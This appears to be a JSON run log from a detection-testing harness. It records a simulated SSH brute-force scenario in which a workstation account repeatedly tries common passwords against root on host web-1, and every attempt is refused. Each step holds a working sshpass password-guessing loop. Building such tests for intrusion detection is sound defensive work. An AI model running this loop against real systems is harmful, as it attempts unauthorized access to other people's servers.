@@ -1,0 +1,127 @@
+{
+  "run_id": "ssh-brute-force-canary-21-2589f3f6",
+  "scenario_id": "ssh-brute-force-canary",
+  "category": "auth-metadata",
+  "description": "Compromised office workstation hammers canary-1's SSH with wrong passwords from a non-privileged identity \u2014 classic rule-5710 (SSH invalid-user / auth-failure) territory. The signal is the burst of failed auth events on canary-1's sshd.",
+  "seed": 21,
+  "overrides": {
+    "target": "web-1"
+  },
+  "resolved": {
+    "intensity": 8,
+    "source_user": "dev.dana",
+    "target_host": "web-1"
+  },
+  "pre_run": {
+    "cr_mode": "none"
+  },
+  "started_at": "2026-07-26T08:38:26+00:00",
+  "finished_at": "2026-07-26T08:41:26+00:00",
+  "aborted": false,
+  "steps": [
+    {
+      "step_index": 0,
+      "iteration": 0,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:38:26+00:00",
+      "ended_at": "2026-07-26T08:38:45+00:00",
+      "duration_s": 19.536
+    },
+    {
+      "step_index": 0,
+      "iteration": 1,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:38:49+00:00",
+      "ended_at": "2026-07-26T08:39:09+00:00",
+      "duration_s": 19.893
+    },
+    {
+      "step_index": 0,
+      "iteration": 2,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:39:13+00:00",
+      "ended_at": "2026-07-26T08:39:33+00:00",
+      "duration_s": 19.618
+    },
+    {
+      "step_index": 0,
+      "iteration": 3,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:39:37+00:00",
+      "ended_at": "2026-07-26T08:39:55+00:00",
+      "duration_s": 18.144
+    },
+    {
+      "step_index": 0,
+      "iteration": 4,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:39:59+00:00",
+      "ended_at": "2026-07-26T08:40:18+00:00",
+      "duration_s": 19.708
+    },
+    {
+      "step_index": 0,
+      "iteration": 5,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:40:22+00:00",
+      "ended_at": "2026-07-26T08:40:42+00:00",
+      "duration_s": 19.462
+    },
+    {
+      "step_index": 0,
+      "iteration": 6,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:40:46+00:00",
+      "ended_at": "2026-07-26T08:41:05+00:00",
+      "duration_s": 19.399
+    },
+    {
+      "step_index": 0,
+      "iteration": 7,
+      "source_host": "office-ws-1",
+      "source_user": "dev.dana",
+      "cmd": "for pw in hunter2 password123 letmein admin secret qwerty; do\n  sshpass -p \"$pw\" ssh -o StrictHostKeyChecking=no \\\n    -o ConnectTimeout=3 -o PreferredAuthentications=password \\\n    -o NumberOfPasswordPrompts=1 \\\n    root@web-1 true 2>&1 | head -1 || true\ndone\n",
+      "rc": 0,
+      "stdout_tail": "root@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\nroot@web-1: Permission denied (publickey,password).\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T08:41:09+00:00",
+      "ended_at": "2026-07-26T08:41:26+00:00",
+      "duration_s": 16.972
+    }
+  ]
+}
